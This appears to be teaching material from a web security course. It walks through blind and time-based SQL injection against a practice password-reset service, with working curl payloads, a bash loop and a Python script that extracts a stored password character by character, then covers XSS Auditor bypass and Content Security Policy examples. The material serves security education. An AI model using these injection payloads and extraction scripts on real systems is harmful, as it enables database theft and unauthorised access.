Web Security Compendium
=======================

Blind SQL Injection
-------------------
It may happen that injections are possible but results and errors from queries are not directly visible. If, however, the application behaves differently depending on the query that is executed on the server, it is still possible to for an attacker to exfiltrate data and perform other malicious activities.

In fact the application, depending of the success, could show:

* a distinguishable message
* an error
* a broken page
* an empty page

Intuitively, we get a 1-bit boolean answer that can be exploited to leak the content of the database.

We illustrate with a simple example. Consider this vulnerable [password recovery service](http://pwdreset.wutctf.space/) where the code responsible of executing the query is:

```PHP
$sth = $dbh->query("SELECT * FROM people WHERE mail = '" . $_POST['mail']. "'");
```

where `$_POST['mail']` is the input provided by the user. If the query is successful the page shows the message `The new password has been sent to the provided e-mail address`. Otherwise, in case of database errors or if the result set is empty, the message displayed is `E-mail address not found!`.

A simple injection like `' OR 1=1 #` will make the query succeed but will not leak any information about the data. To retrieve database contents via - so called - Blind SQL-injections, a standard approach is to split the data of interest into single bytes and compare, one byte at a time, their values with a guess made by the attacker until a match is found. Standard MySQL functions that are usually used to achieve this goal are `MID`, `CONCAT`, `LENGTH` and `ORD`. See [MySQL string functions](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html) for further details.

Some examples follow.

### Content Exfiltration

We want to dump the password of the second user in the `people` table at our [password recovery service](http://pwdreset.wutctf.space/). We use `curl` to exemplify as follows:

```
$ curl -s 'http://pwdreset.wutctf.space/' --data "mail=' or 1=1 #" | grep -q sent && echo OK
OK
```

The above command sends a POST request to the website with mail parameter set to `' or 1=1 #`, making the query succeed. Then, the `sent` string (which is part of the success message printed by the website) is searched in the page and, if found, `OK` is printed on our shell. We can now move on to dump the password:

```
$ curl -s 'http://pwdreset.wutctf.space/' --data "mail=' OR BINARY 'H'=(SELECT MID(password, 1, 1) FROM people LIMIT 1,1) #" | grep -q sent && echo OK
OK
$ curl -s 'http://pwdreset.wutctf.space/' --data "mail=' OR BINARY 'i'=(SELECT MID(password, 2, 1) FROM people LIMIT 1,1) #" | grep -q sent && echo OK
OK
$ curl -s 'http://pwdreset.wutctf.space/' --data "mail=' OR BINARY 'A'=(SELECT MID(password, 3, 1) FROM people LIMIT 1,1) #" | grep -q sent && echo OK
OK
$ curl -s 'http://pwdreset.wutctf.space/' --data "mail=' OR BINARY 'Z'=(SELECT MID(password, 4, 1) FROM people LIMIT 1,1) #" | grep -q sent && echo OK
$
```

Here we have just guessed that the first 4 letters of the password are `HiAZ`. The first 3 requests returned `OK`, but not the fourth one. So we can state that the password starts with `HiA`, but the fourth letter is not `Z`.


### Scripting

Testing each character by hand is a time consuming and error-prone task. Attackers usually rely on tools that automatize the process.

To get the fourth letter of the password, we can perform a linear search over the possible characters. A rough one-liner in bash is the following:

```
$ for guess in {A..z}; do curl -s 'http://pwdreset.wutctf.space/' --data "mail=' OR BINARY '${guess}'=(SELECT MID(password, 4, 1) FROM people LIMIT 1,1) #" | grep -q sent && echo "${guess}" && break; done
l
```

A more elegant and extensible approach would consist in writing a python script using the [request](http://docs.python-requests.org/en/master/) library.

```Python
#!/usr/bin/env python3

import sys
import string
import requests

BASE_URL = "http://pwdreset.wutctf.space/"
QUERY_FMT = "' OR BINARY '{char}'=(SELECT MID(password, {pos}, 1) FROM people LIMIT 1,1) #"
SUCCESS_MSG = "sent"

def oracle(s, c, pos):
    r = s.post(BASE_URL, data={'mail': QUERY_FMT.format(char=c, pos=pos)})
    return SUCCESS_MSG in r.text

def main():
    if len(sys.argv) != 2:
        sys.stderr.write('Usage: {} <position>\n'.format(sys.argv[0]))
        sys.exit(1)

    s = requests.Session()
    chars = string.ascii_letters + string.digits
    for c in chars:
        if oracle(s, c, int(sys.argv[1])):
            print(c)
            break

if __name__ == '__main__':
    main()
```

By combining Python and Bash we can do

```
$ for i in {1..100}; do ./bsqi-linear.py "${i}" | tr -d '\n'; done; echo
HiAllurwelCometochecKmyunguEssablepasswoRd
```

... but seriously, do everything directly in Python!


Totally Blind SQL Injections
----------------------------
Sometimes the query is executed on the server, but its result does not affect the rendered page. In this case, it is still possible to infer some information on the query result by leveraging the time spent for its execution. For instance, MySQL provides the [`SLEEP`](https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_sleep) function that can be invoked by an attacker when an injected condition evaluates to true. Using this technique, we can measure the time spent by `curl` to execute in order to extract the first character of the password:

```
$ time curl 'http://pwdreset.wutctf.space/' --data "mail=' OR IF(BINARY 'H'=(SELECT MID(password, 1, 1) FROM people LIMIT 1,1), SLEEP(1), NULL) #" &>/dev/null

real	0m3.273s
user	0m0.008s
sys	0m0.007s
```

Notice that the `IF(...)` expression is evaluated once per row. Since the table `people` has `3` rows, the elapsed time is `3` seconds even if we injected a sleep of `1` second. To overcome this limitation, it would be enough to leak one valid match for the `mail` column and substitute the `OR` with an `AND` as follows:

```
$ time curl 'http://pwdreset.wutctf.space/' --data "mail=marco.squarcina@tuwien.ac.at' AND IF(BINARY 'H'=(SELECT MID(password, 1, 1) FROM people LIMIT 1,1), SLEEP(1), NULL) #" &>/dev/null

real	0m1.573s
user	0m0.007s
sys	0m0.006s
```

XSS Mitigations
---------------
If you ever thought that preventing XSS is a trivial task that can be achieved by replacing special characters such as `<`, `>`, `'`, `"`, `&` and `/` on the server side, you should reconsider your position. Even the Google search form has been affected recently by a [reflected XSS vulnerability](https://www.youtube.com/watch?v=lG7U3fuNw3A) for more than 5 months!

### XSS Auditor

A category of mitigations aimed at preventing reflected XSS, consists in filtering the content of a page if a dangerous string in the url is matched in the body. Chrome ships this kind of protection under the name of [XSS Auditor](https://www.chromium.org/developers/design-documents/xss-auditor). This mechanism is, however, easy to bypass whenever the attacker can split the malicious payload into 2 GET variables which are combined - at the server side - when serving the final page. Additionally, XSS Auditor has been abused in the past to strip inline scripts from safe webpages to introduce vulnerabilities.

### Content Security Policy (CSP)

The [Content Security Policy](https://www.w3.org/TR/CSP3/) is a policy-based defense mechanism that enables the browser to restrict the contents that can be embedded by a webpage. The policy is provided by the server through an HTTP header and enforced by the browser. 

CSP can be used as a defense-in-depth mechanism for XSS since it allows to:

* forbid the execution of harmful JS functions, e.g., `eval`
* prevent the execution of inline scripts
* control from which origins it is safe to include external scripts

Some examples of valid CSP policies follow.

All content must come from the site's own origin, `eval` and inline scripts are disabled by default:

```HTTP
Content-Security-Policy: default-src 'self'
```

All content, except scripts, must come from the site's own origin. `eval` and inline scripts are disabled. Scripts are only allowed to be included from `trusted.cdn.com`:

```HTTP
Content-Security-Policy: default-src 'self'; script-src trusted.cdn.com
```

As before, but also allow scripts whose `sha256` hash matches the value specified in the policy (only inline scripts up to CSP2, while CSP3 includes support for [SRI](https://www.w3.org/TR/SRI/) for 3rd-parties scripts):

```HTTP
Content-Security-Policy: default-src 'self'; script-src trusted.cdn.com 'sha256-B2yPHKaXnvFWtRChIbabYmUBFZdVfKKXHbWtWidDVF8='
```

Unsafe policy that allows inline `<script>` elements, `javascript:` URLs, inline event handlers, inline `<style>` elements, use of `eval()` and similar functions and script inclusion from any origin:


```HTTP
Content-Security-Policy: default-src 'self'; script-src * 'unsafe-inline' 'unsafe-eval'
```
